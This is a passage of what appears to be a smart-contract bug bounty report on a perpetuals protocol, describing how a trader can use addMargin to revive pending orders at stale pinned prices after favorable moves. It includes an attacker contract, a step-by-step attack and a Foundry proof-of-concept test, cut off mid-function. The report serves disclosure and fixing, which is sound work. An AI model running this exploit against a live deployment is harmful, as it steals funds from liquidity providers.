# \#98732 [SC-Low] CfdEngine.addMargin lets a trader meet its pending order's equity or leverage bound after the price moves, leading to direct theft of user funds from LPs

**Submitted on Nov 9th 2026 at 22:11:33 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98732
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An order's fill price is pinned to the first Pyth update after its commit, and anyone can execute the order until its deadline. Two of the order's own bounds, `minPostPositionEquityAssets` and `maxPostLeverageBps`, are checked only at execution, against the position's margin at that moment. A miss ends the order for good, and nothing opens. `CfdEngine.addMargin` changes that margin at any time and never looks at the account's pending orders. So the attacker commits each increase with an equity bound its position cannot meet. A keeper that executes the order first can only kill it, for a 0.20 USDG bounty. When the price moves the attacker's way first, one transaction adds margin and executes the order at its old pinned price. In the run below, six hourly rounds of 30 bps moves, with a keeper reaching the order first in four of them, end with the attacker 10,617.44 USDG richer in its own wallet after it withdraws everything. The victim LP's Junior is worth 13,678.35 USDG less than over the same hours with no increase orders, and 24,076.04 USDG less than with the same orders and no bound.

## Vulnerability Details

1. The attacker holds a LONG and commits a same-side increase through `Router.commitOrder`, with `minPostPositionEquityAssets` set to its position margin plus 40,000 USDG. At commit the only check on the two bounds is that `maxPostLeverageBps` is nonzero (`OrderLiquidationBatchLogic.sol:298-300`). Nothing else in `src` reads them before execution.
2. The fill price is pinned at commit. The oracle parses the first unique update in `(commitTime, min(commitTime + orderSettlementWindow, now)]` (`PletherOracle.sol:610-614`) and keeps that parsed basket as the price even when storage holds newer prices (`PletherOracle.sol:621-623`). `Router.executeOrder` has no caller restriction (`OrderRouter.sol:240-243`).
3. At execution the policy evaluator compares the bounds with post-trade equity and post-trade leverage (`CfdOrderPolicyEvaluatorBase.sol:530-539`). A miss reverts `ConstraintViolation`, and the Router records a terminal `ConstraintViolation` (`OrderRouterExecutionSidecar.sol:879-893`). The order is deleted with status `Failed`, nothing opens, and the order's execution bounty is paid to the executor (`OrderRouter.sol:304-311`, `:331-342`). In the run each kill pays the keeper 0.20 USDG.
4. `CfdEngine.addMargin` checks only that the caller is the account, that the amount is nonzero and that a position exists (`CfdEngine.sol:505-515`). It then locks free settlement as position margin (`CfdEngine.sol:520-523`). It reads neither the account's pending orders nor their bounds.
5. After a favorable move the attacker calls `addMargin(40,000 USDG)` and `executeOrder(id, pinnedUpdate)` in one transaction. Post-trade equity now clears the bound, and the increase fills at the pinned pre-move price while the engine mark already carries the move.
6. The guard that should stop this exists for the third financial bound only. A positive `minPostSettlementBalanceAssets` must be funded at commit (`OrderLiquidationBatchLogic.sol:259-266`), is accepted only on an open from a flat account with no other pending order (`OrderLiquidationBatchLogic.sol:307-312`), and is re-checked on every owner withdrawal while the order is pending (`CfdEngineSettlementSidecar.sol:261-271`). The spec states the purpose: "This protection prevents owner withdrawals from manufacturing a settlement-minimum failure; it does not freeze market-dependent financial bounds." (`ACCOUNTING_SPEC.md:930-931`). The equity and leverage bounds stay open to the market by design. In this attack the owner decides them: it calls `addMargin` after the market has moved, and no guard covers that input.
7. The guarantee this breaks: "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options" (`SECURITY.md:658-659`).

### Vulnerable source code

**1. the order's equity and leverage bounds, read only at execution** @ packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:530-539

```solidity
        uint256 normalizedEquityAssets =
            assessment.postPositionEquityAssets > 0 ? uint256(assessment.postPositionEquityAssets) : 0;
        if (assessment.postPositionEquityAssets < 0 || normalizedEquityAssets < bounds.minPostPositionEquityAssets) {
            revert ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation(
                OrderV3Types.ConstraintKind.PostPositionEquity,
                normalizedEquityAssets,
                bounds.minPostPositionEquityAssets
            );
        }
        _requireMaximum(OrderV3Types.ConstraintKind.PostLeverage, assessment.postLeverageBps, bounds.maxPostLeverageBps);
```

**2. a bound miss is terminal** @ packages/perps/src/OrderRouterExecutionSidecar.sol:879-886

```solidity
        if (
            selector == ICfdOrderPolicyEvaluator.CfdOrderPolicyEvaluator__ConstraintViolation.selector
                && revertData.length == 100
        ) {
            uint256 constraint = _word(revertData, 4);
            if (constraint > 0 && constraint <= uint256(OrderV3Types.ConstraintKind.PostLeverage)) {
                classification.terminal = true;
                classification.reason = OrderV3Types.TerminalReason.ConstraintViolation;
```

**3. addMargin: owner, amount and position checks, no pending-order check** @ packages/perps/src/CfdEngine.sol:505-515

```solidity
        if (msg.sender != account) {
            revert CfdEngine__NotAccountOwner();
        }
        if (amount == 0) {
            revert CfdEngine__ZeroAmount();
        }
        StoredPosition storage pos = _positions[account];
        if (pos.lots == 0) {
            revert CfdEngine__NoOpenPosition();
        }
```

**4. the fill is pinned to the first update after the commit** @ packages/perps/src/PletherOracle.sol:610-614

```solidity
        uint64 minPublishTime = request.commitTime + 1;
        uint256 settlementDeadline = uint256(request.commitTime) + orderSettlementWindow;
        uint64 maxPublishTime = uint64(settlementDeadline < block.timestamp ? settlementDeadline : block.timestamp);
        try pyth.parsePriceFeedUpdatesUnique{value: pythFee}(
            pythUpdateData, pythFeedIds, minPublishTime, maxPublishTime
```

**5. the one bound guarded against its owner: the settlement floor, re-checked on withdrawal** @ packages/perps/src/CfdEngineSettlementSidecar.sol:262-270

```solidity
            (uint64 orderId, uint256 minimum, uint256 maxDebit) =
                OrderSettlementFloorLib.load(engine.orderRouter(), account);
            if (minimum != 0) {
                uint256 balance = IMarginClearinghouse(host.clearinghouse()).balanceAssets(account);
                if (balance < minimum || balance - minimum < maxDebit) {
                    revert IOrderRouterErrors.OrderRouter__SettlementFloorWithdrawal(
                        orderId, balance, minimum, maxDebit
                    );
                }
```

## Impact Details

- Impact row: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical). After six rounds the attacker closes everything and withdraws its whole balance. Its wallet holds 310,617.435905 USDG against 300,000.000000 USDG at the start, +10,617.435905 USDG. Victim LP_J's Junior is worth 9,986,659.745361 USDG against 10,000,338.092580 USDG over the same hours with no increase orders, -13,678.347219 USDG, and -24,076.039897 USDG against the same orders without the bound.
- A keeper cannot make the attacker lose on an armed order. A keeper reached it first in four rounds, two of them at commit + 1 s before any move. All four executions ended `ConstraintViolation` with nothing opened, for 0.80 USDG of bounties in total. The same six orders without the bound lose 18,259.341922 USDG.
- The fuzz test runs 256 cases over moves of 1 to 60 bps, increases of 1,000 to 3,000,000 USDG notional and both bounds. In every case a keeper execution of the armed order ends `ConstraintViolation` with nothing opened, and after `addMargin` the same order fills within 1 bp of its pinned tick and above the moved mark.
- Prerequisites, all permissionless: an open position, free margin for the increase and the rescue (300,000 USDG in the run), and a contract account that bundles `addMargin` and `executeOrder`. The run uses a 3,000,000 USDG increase on a 10,000,000 USDG pool, and the gain scales with the increase size.
- The victim sees ordinary fills. Each revived order is an `Executed` order at its own pinned update, and every LP pays pro rata through the pool's trading P&L.
- It repeats on every order. It needs no LP epoch, no pool at a solvency line and no second account, and each account holds up to 5 pending orders (`router.maxPendingOrders()`).
- The race with keepers sets how often a round pays. Immunefi's mediation on #97858 ruled on the same keeper race and the same need for a favorable move before the first keeper execution: "These points bear on how often the attack pays and at what cost. They do not change what happens when it pays."
- Dedup note. This is a sibling of my report #97858, with its own root cause and its own fix. Both reports break `SECURITY.md:658-659`, through two defects in two places:

| | #97858 | this report |
|---|---|---|
| check that voids the order | the planner's solvency check on pool cash (`CfdEnginePlanLib.sol:755-772`, `:421-424`) | the order's own equity and leverage bounds (`CfdOrderPolicyEvaluatorBase.sol:530-539`) |
| failure path | `SOLVENCY_EXCEEDED`, a protocol-state code (`CfdEnginePlanLib.sol:119-125`), recorded as `PlannerRejected` (`OrderRouterExecutionSidecar.sol:846-853`) | the policy evaluator's `ConstraintViolation` (`OrderRouterExecutionSidecar.sol:879-893`) |
| who sets the threshold | the protocol (`settlementBufferBps`) | the trader, in its own request |
| what the owner changes | pool cash, a global value, through `Router.settleLpEpoch` and the liquidation of a second account (`OrderRouter.sol:479-484`, `:493-500`) | its own position margin, through `CfdEngine.addMargin` (`CfdEngine.sol:501-529`) |
| what the run needs | a pool at the solvency line, a matured Junior lot, a thin SHORT | an open position |

- Root cause of #97858: execution re-checks solvency against pool cash, and permissionless calls from any account move that cash after the commit. Root cause here: `CfdEngine.addMargin` changes the input of two execution-only bounds while their order is pending, and the protocol guards that kind of input against its owner only for the settlement floor.
- Fix of #97858: it is fixed at its own check, for example by binding the open's solvency at commit. A per-account guard does not reach it, because its levers are a global permissionless call and the liquidation of a second account. That fix leaves this report's PoC unchanged: the PoC never calls `settleLpEpoch` or a liquidation, and the 10,000,000 USDG pool never comes near the solvency line.
- Fix of this report: an account-local guard on `CfdEngine.addMargin`, the same kind the settlement floor already has. Reject `addMargin` while the account has a pending order with a nonzero `minPostPositionEquityAssets` or a finite `maxPostLeverageBps`, or evaluate both bounds against the margin at commit. That fix leaves #97858 unchanged: #97858 never calls `addMargin`, and its orders carry `minPostPositionEquityAssets = 0` and `maxPostLeverageBps = type(uint32).max`.
- History. The equity and leverage bounds arrived with Plether-Fi/plether-core#71 ("Add bounded, verifiable agent order execution", merged 2026-08-26), after the 4 May 2026 pre-audit that reported SC-M4. Plether-Fi/plether-core#113 (`fd4e0395`, merged 2026-10-14) then added an owner guard for the settlement-floor bound only: `OrderSettlementFloorLib`, the withdrawal check in `CfdEngineSettlementSidecar.sol` and the commit rules in `OrderLiquidationBatchLogic.sol`. The equity and leverage bounds got no guard, and `addMargin` was not changed.
- Known issues. SC-M4 (pre-audit, marked fixed) is #97858's known issue; its component 3 refunds a losing order "by manipulating the vault depth". This report changes no vault depth and no pool cash. The order bounds appear in no audit report or known issue, and the only audit mentions of `addMargin` are Cecuro LOW-7 (its zero-amount error) and an AI-scan note on one-atom carry checkpoints. HIGH-1 (commit after an already published price) is a different root: here the order is committed before its tick.

## References

Order bounds and their terminal failure
- packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:530-539 - equity and leverage bounds, evaluated at execution
- packages/perps/src/OrderRouterExecutionSidecar.sol:879-893 - `ConstraintViolation` is terminal
- packages/perps/src/OrderRouter.sol:304-311 - terminal order deleted with status `Failed`
- packages/perps/src/OrderRouter.sol:331-342 - the failed order's bounty paid to the executor
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:298-300 - the only commit-time check on the two bounds

The owner's lever
- packages/perps/src/CfdEngine.sol:501-529 - `addMargin`, no pending-order check

Pinned fill
- packages/perps/src/PletherOracle.sol:610-614 - first unique update after the commit
- packages/perps/src/PletherOracle.sol:621-623 - the parsed basket stays the price
- packages/perps/src/OrderRouter.sol:240-243 - `executeOrder`, no caller restriction

The settlement floor, the bound with an owner guard
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:259-266 - funded at commit
- packages/perps/src/router/OrderLiquidationBatchLogic.sol:307-312 - only on an open from a flat account with no other pending order
- packages/perps/src/CfdEngineSettlementSidecar.sol:261-271 - re-checked on owner withdrawal
- packages/perps/ACCOUNTING_SPEC.md:930-931 - "prevents owner withdrawals from manufacturing a settlement-minimum failure"

Report #97858's separate path
- packages/perps/src/libraries/CfdEnginePlanLib.sol:421-424 - `SOLVENCY_EXCEEDED`
- packages/perps/src/libraries/CfdEnginePlanLib.sol:755-772 - solvency built from pool cash
- packages/perps/src/libraries/CfdEnginePlanLib.sol:119-125 - protocol-state failure category
- packages/perps/src/OrderRouterExecutionSidecar.sol:846-853 - recorded as `PlannerRejected`
- packages/perps/src/OrderRouter.sol:479-484 - `settleLpEpoch`, permissionless
- packages/perps/src/OrderRouter.sol:493-500 - `executeLiquidation`, permissionless

History
- Plether-Fi/plether-core#71 - the order bounds, merged 2026-08-26
- Plether-Fi/plether-core#113 (`fd4e0395`) - the owner guard for the settlement floor only, merged 2026-10-14

Guarantee
- packages/perps/SECURITY.md:658-659 - no free options from queued intents
- audits/plether-pre-audit-report.pdf - SC-M4, component 3, "Fixed in Plether-Fi/plether-core#24"

## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/c64aa1090c2f5ef4fb956b428e00c1b3

## Proof of Concept

## Proof of Concept

One test plays the same six hours three times from one snapshot: the attack, a control with the same orders and no bound in which a keeper fills each order at commit + 1 s, and a baseline with the base position only. A fuzz test checks the kill and the revive for any move, any size and both bounds. Both run in the repo's Foundry suite at a82d4fef on the repo's own `BasePerpTest` with the `DEPLOYMENT.md` release parameters, and only USDG and Pyth are the repo's mocks. Files: https://gist.github.com/decies-centena-millia/c64aa1090c2f5ef4fb956b428e00c1b3

```bash
mkdir -p packages/perps/test/poc && cp EquityBoundFreeOptionPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/EquityBoundFreeOptionPoC.t.sol -vv
```

### attack step-by-step

1. Victim LP_J deposits 10,000,000 USDG of Junior. ATTACKER deploys `OptionAccount`, funds it with 300,000 USDG of margin and opens a 750,000 USDG LONG with 20,000 USDG of margin.
2. Each hour, `OptionAccount.commit` commits a 3,000,000 USDG LONG increase with 20,000 USDG of margin and `minPostPositionEquityAssets` set to the position margin plus 40,000 USDG. Its pinned update is the one at commit + 1 s.
3. At commit + 2 s the price moves 30 bps, and a keeper installs the newer mark.
4. Rounds 3 and 4: a keeper executes the order at commit + 1 s, before the move: `ConstraintViolation`, nothing opens. Rounds 1 and 6 (adverse): the attacker does nothing, and the keeper's execution at commit + 3 s kills the order.
5. Rounds 2 and 5 (favorable, seen at commit + 3 s): `OptionAccount.exercise` calls `CfdEngine.addMargin(40,000 USDG)` and `Router.executeOrder` with the pinned update in one transaction. The increase fills at the pinned price, and a close then fills at the moved price.
6. After round 6 the account closes everything, and ATTACKER withdraws the whole balance to its wallet.

## main Attack code

```solidity
// commit: the order's own bound sits above what the position reaches at its pinned tick
OrderV3Types.OrderRequest memory r = _request(CfdTypes.Side.LONG, INC, INC_MARGIN, false);
r.bounds.minPostPositionEquityAssets = _margin() + INC_MARGIN + SLACK;
acct.commit(r);

// one transaction after a favorable move: lift the position's equity over the bound, then execute at the pinned tick
function exercise(uint256 rescue, uint64 orderId, bytes[] calldata pinned)
    external
    onlyOwner
    returns (OrderV3Types.ExecutionResult memory result)
{
    engine.addMargin(address(this), rescue);
    result = router.executeOrder(orderId, pinned);
}
```

```
plant : an increase committed with minPostPositionEquityAssets above what the position reaches at its pinned tick
fire  : CfdEngine.addMargin and Router.executeOrder with the pinned update, in one transaction, after a favorable move
```

### full poc code, single file, single runnable command

Foundry: forge 1.8.5 (51a52c5), solc 0.8.35, the repo's default `packages/perps/foundry.toml` profile (`via_ir = true`, optimizer 200 runs, fuzz seed `0xdeadbeef`, 256 runs).

`EquityBoundFreeOptionPoC.t.sol`, placed at `packages/perps/test/poc/EquityBoundFreeOptionPoC.t.sol`. It imports only the repo's `packages/perps/test/perps/BasePerpTest.sol` and the repo's mocks. Command, from the repo root at a82d4fef:

```bash
mkdir -p packages/perps/test/poc && cp EquityBoundFreeOptionPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/EquityBoundFreeOptionPoC.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console2} from "forge-std/console2.sol";

abstract contract PocBase is BasePerpTest {
    // DEPLOYMENT.md release parameters.
    function _riskParams() internal pure virtual override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure virtual override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure virtual override returns (uint256) {
        return 1e6;
    }

    function setUp() public virtual override {
        super.setUp();
        uint256 start = vm.getBlockTimestamp();
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = 40_000_000e6;
        poolConfig.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(poolConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.adverseConfidenceMultiplierBps = 2500;
        routerConfig.minOpenNotionalAssets = 1000e6;
        _setRouterConfig(routerConfig);
        vm.warp(start);
        vm.roll(vm.getBlockNumber() + 1);
        _assertReleaseConfig();
    }

    function _assertReleaseConfig() internal view {
        assertEq(engine.executionFeeBps(), 4, "release executionFeeBps");
        assertEq(engine.settlementBufferBps(), 25, "release settlementBufferBps");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozenCloseSpreadBps");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release minOpenNotionalAssets");
        assertEq(router.maxPendingOrders(), 5, "release maxPendingOrders");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
        assertEq(router.pletherOracle().basketMaxConfidenceRatioBps(), 10, "release basket confidence cap");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release maxSeniorExposureAssets");
        assertEq(pool.maxSeniorShareBps(), 8000, "release maxSeniorShareBps");
        (,, uint256 maint, uint256 init_, uint256 fad,,,,,) = engine.riskParams();
        assertEq(maint, 10, "release maintMarginBps");
        assertEq(init_, 20, "release initMarginBps");
        assertEq(fad, 300, "release fadMarginBps");
    }

    // USDG atoms (6 decimals) as "1234567.890123".
    function _usd(uint256 atoms) internal pure returns (string memory) {
        bytes memory f = bytes(vm.toString(atoms % 1e6 + 1e6));
        bytes memory frac = new bytes(6);
        for (uint256 i; i < 6; ++i) frac[i] = f[i + 1];
        return string.concat(vm.toString(atoms / 1e6), ".", string(frac));
    }

    function _usdSigned(int256 atoms) internal pure returns (string memory) {
        return atoms < 0 ? string.concat("-", _usd(uint256(-atoms))) : string.concat("+", _usd(uint256(atoms)));
    }

    function _px8(uint256 price) internal pure returns (string memory) {
        bytes memory f = bytes(vm.toString(price % 1e8 + 1e8));
        bytes memory frac = new bytes(8);
        for (uint256 i; i < 8; ++i) frac[i] = f[i + 1];
        return string.concat(vm.toString(price / 1e8), ".", string(frac));
    }

    function _row(string memory a, string memory b, string memory c, string memory d) internal pure {
        console2.log(string.concat("    ", _pad(a, 30), _pad(b, 22), _pad(c, 22), d));
    }

    function _pad(string memory s, uint256 width) internal pure returns (string memory) {
        bytes memory b = bytes(s);
        if (b.length >= width) return string.concat(s, " ");
        bytes memory out = new bytes(width);
        for (uint256 i; i < width; ++i) out[i] = i < b.length ? b[i] : bytes1(" ");
        return string(out);
    }
}

interface IPocRouter {
    function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId);
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory result);
}

interface IPocEngine {
    function addMargin(address account, uint256 amount) external;
}

interface IPocClearinghouse {
    function depositMargin(uint256 amount) external;
    function withdrawMargin(uint256 amount) external;
    function balanceAssets(address account) external view returns (uint256);
}

// The attacker's trading account: its own position, its own orders, its own margin.
contract OptionAccount {
    address internal immutable owner;
    IPocRouter internal immutable router;
    IPocEngine internal immutable engine;
    IPocClearinghouse internal immutable clearinghouse;
    IERC20 internal immutable usdg;

    constructor(address router_, address engine_, address clearinghouse_, address usdg_) {
        owner = msg.sender;
        router = IPocRouter(router_);
        engine = IPocEngine(engine_);
        clearinghouse = IPocClearinghouse(clearinghouse_);
        usdg = IERC20(usdg_);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    function fund(uint256 amount) external onlyOwner {
        usdg.transferFrom(owner, address(this), amount);
        usdg.approve(address(clearinghouse), amount);
        clearinghouse.depositMargin(amount);
    }

    function commit(OrderV3Types.OrderRequest calldata request) external onlyOwner returns (uint64 orderId) {
        orderId = router.commitOrder(request);
    }

    // One transaction after a favorable move: lift the position's equity over the order's own bound, then execute
    // the order with its pinned pre-move update.
    function exercise(uint256 rescue, uint64 orderId, bytes[] calldata pinned)
        external
        onlyOwner
        returns (OrderV3Types.ExecutionResult memory result)
    {
        engine.addMargin(address(this), rescue);
        result = router.executeOrder(orderId, pinned);
    }

    function withdrawAll() external onlyOwner {
        uint256 balance = clearinghouse.balanceAssets(address(this));
        clearinghouse.withdrawMargin(balance);
        usdg.transfer(owner, balance);
    }
}

contract EquityBoundFreeOptionPoC is PocBase {
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant KEEPER = address(0x4B33);
    address internal constant LP_J = address(0x1117);

    uint256 internal constant DEPTH = 10_000_000e6;
    uint256 internal constant FUND = 300_000e6;
    uint256 internal constant BASE = 750_000e18; // 750,000 USDG notional at 1.00
    uint256 internal constant BASE_MARGIN = 20_000e6;
    uint256 internal constant INC = 3_000_000e18; // 3,000,000 USDG notional at 1.00
    uint256 internal constant INC_MARGIN = 20_000e6;
    uint256 internal constant SLACK = 20_000e6;
    uint256 internal constant RESCUE = 40_000e6;
    uint256 internal constant MOVE_BP = 30;
    uint256 internal constant ROUNDS = 6;
    uint64 internal constant CONF = 2e4; // 2 bps of the 1.00 price on each feed

    enum Mode {
        Attack,
        Control,
        Baseline
    }

    struct Outcome {
        uint256 attackerWallet;
        uint256 victimValue;
        uint256 keeperBounties;
        uint256 killed;
        uint256 exercised;
    }

    struct Round {
        bool favorable;
        bool attackerFirst;
        uint256 keeperDelay;
        uint256 t0;
        uint256 m;
        uint256 m1;
        uint64 id;
        bool filled;
    }

    OptionAccount internal acct;
    uint256 private nonce;

    function setUp() public override {
        super.setUp();
        _fundJunior(LP_J, DEPTH);
        settlementToken.mint(ATTACKER, FUND);
        vm.startPrank(ATTACKER);
        acct = new OptionAccount(address(router), address(engine), address(clearinghouse), address(settlementToken));
        settlementToken.approve(address(acct), FUND);
        acct.fund(FUND);
        vm.stopPrank();
    }

    function _tick(uint256 price, uint256 t) internal pure returns (bytes[] memory updateData) {
        int64 p = int64(uint64(price));
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](2);
        updates[0] = MockPyth.FeedUpdate({id: BASE_PYTH_FEED_A, price: MockPyth.MockPrice(p, CONF, int32(-8), t, t - 1)});
        updates[1] = MockPyth.FeedUpdate({id: BASE_PYTH_FEED_B, price: MockPyth.MockPrice(p, CONF, int32(-8), t, t - 1)});
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _at(uint256 t) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _live(uint256 price) internal {
        bytes[] memory d = _tick(price, vm.getBlockTimestamp());
        vm.prank(KEEPER);
        router.updateMarkPrice(d);
    }

    function _request(CfdTypes.Side side, uint256 size, uint256 margin, bool isClose)
        internal
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = keccak256(abi.encode("poc", ++nonce));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp()) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commit(OrderV3Types.OrderRequest memory request) internal returns (uint64 id) {
        vm.prank(ATTACKER);
        id = acct.commit(request);
    }

    function _keeperExec(uint64 id, bytes[] memory data) internal returns (OrderV3Types.TerminalReason) {
        vm.prank(KEEPER);
        return router.executeOrder(id, data).terminalReason;
    }

    function _kill(uint64 id, bytes[] memory pinned, Outcome memory o) internal {
        uint256 before = clearinghouse.balanceAssets(KEEPER);
        require(_keeperExec(id, pinned) == OrderV3Types.TerminalReason.ConstraintViolation, "keeper kill");
        o.keeperBounties += clearinghouse.balanceAssets(KEEPER) - before;
        o.killed++;
    }

    function _exercise(uint64 id, bytes[] memory pinned) internal returns (OrderV3Types.TerminalReason) {
        vm.prank(ATTACKER);
        return acct.exercise(RESCUE, id, pinned).terminalReason;
    }

    function _size() internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(address(acct));
    }

    function _margin() internal view returns (uint256 margin) {
        (, margin,,,,,) = engine.positions(address(acct));
    }

    // A fill whose own bound the position cannot meet at the pinned tick.
    function _armedIncrease(uint256 size, uint256 margin) internal returns (OrderV3Types.OrderRequest memory r) {
        r = _request(CfdTypes.Side.LONG, size, margin, false);
        r.bounds.minPostPositionEquityAssets = _margin() + margin + SLACK;
    }

    function _openBase(uint256 t) internal {
        _at(t);
        _live(1e8);
        uint64 id = _commit(_request(CfdTypes.Side.LONG, BASE, BASE_MARGIN, false));
        _at(t + 1);
        require(_keeperExec(id, _tick(1e8, t + 1)) == OrderV3Types.TerminalReason.Executed, "base open");
    }

    function _closeLots(uint256 t, uint256 size, uint256 price) internal {
        _at(t);
        _live(price);
        uint64 id = _commit(_request(CfdTypes.Side.LONG, size, 0, true));
        _at(t + 1);
        require(_keeperExec(id, _tick(price, t + 1)) == OrderV3Types.TerminalReason.Executed, "close");
    }

    // Rounds 1-6: adverse/keeper at +3 s, favorable/attacker, adverse/keeper at +1 s, favorable/keeper at +1 s,
    // favorable/attacker, adverse/keeper at +3 s.
    function _schedule(uint256 k) internal pure returns (bool favorable, bool attackerFirst, uint256 keeperDelay) {
        bool[ROUNDS] memory fav = [false, true, false, true, true, false];
        bool[ROUNDS] memory att = [false, true, false, false, true, false];
        uint256[ROUNDS] memory delay = [uint256(3), 3, 1, 1, 3, 3];
        return (fav[k], att[k], delay[k]);
    }

    function _round(uint256 k, uint256 t0, uint256 m, Mode mode, Outcome memory o) internal returns (uint256) {
        Round memory r;
        (r.favorable, r.attackerFirst, r.keeperDelay) = _schedule(k);
        r.t0 = t0;
        r.m = m;
        r.m1 = r.favorable ? m * (10_000 - MOVE_BP) / 10_000 : m * (10_000 + MOVE_BP) / 10_000;

        _at(r.t0);
        _live(r.m);
        if (mode == Mode.Attack) r.id = _commit(_armedIncrease(INC, INC_MARGIN));
        if (mode == Mode.Control) r.id = _commit(_request(CfdTypes.Side.LONG, INC, INC_MARGIN, false));
        bytes[] memory pinned = _tick(r.m, r.t0 + 1);

        _at(r.t0 + 1);
        if (mode == Mode.Control) {
            require(_keeperExec(r.id, pinned) == OrderV3Types.TerminalReason.Executed, "control fill");
            r.filled = true;
        } else if (mode == Mode.Attack && !r.attackerFirst && r.keeperDelay == 1) {
            _kill(r.id, pinned, o);
            _say(k, r, "KEEPER executes first at commit + 1 s: ConstraintViolation, nothing opens");
        }

        _at(r.t0 + 2);
        _live(r.m1);

        _at(r.t0 + 3);
        if (mode == Mode.Attack && r.attackerFirst) {
            uint256 costBefore = engine.positionEntryCostAssetAtoms(address(acct));
            require(_exercise(r.id, pinned) == OrderV3Types.TerminalReason.Executed, "revive");
            uint256 fillPx = (engine.positionEntryCostAssetAtoms(address(acct)) - costBefore) / (INC / CfdTypes.SIZE_QUANTUM);
            assertGt(fillPx, engine.lastMarkPrice(), "the revived order fills above the moved mark");
            r.filled = true;
            o.exercised++;
            _say(
                k,
                r,
                string.concat(
                    "attacker calls addMargin and executes in one transaction: fills at ",
                    _px8(fillPx),
                    " from its pinned tick ",
                    _px8(r.m),
                    " while the live mark is ",
                    _px8(engine.lastMarkPrice())
                )
            );
        } else if (mode == Mode.Attack && r.keeperDelay == 3) {
            _kill(r.id, pinned, o);
            _say(k, r, "attacker does nothing; the keeper's execution at commit + 3 s: ConstraintViolation, nothing opens");
        }

        if (r.filled) _closeLots(r.t0 + 4, INC, r.m1);
        if (mode == Mode.Control) _say(k, r, "keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price");
        return r.m1;
    }

    function _say(uint256 k, Round memory r, string memory what) internal pure {
        console2.log(
            string.concat(
                "     round ",
                vm.toString(k + 1),
                r.favorable ? " (favorable " : " (adverse ",
                vm.toString(MOVE_BP),
                " bps): ",
                what
            )
        );
    }

    function _run(Mode mode) internal returns (Outcome memory o) {
        console2.log(
            mode == Mode.Attack
                ? "-- ATTACK: every increase armed with its own equity bound, revived by addMargin after a favorable move"
                : (mode == Mode.Control ? "-- CONTROL: same orders, no bound, a keeper fills each at commit + 1 s" : "-- BASELINE: base position only")
        );
        uint256 start = vm.getBlockTimestamp() + 10 minutes;
        _openBase(start);
        uint256 m = 1e8;
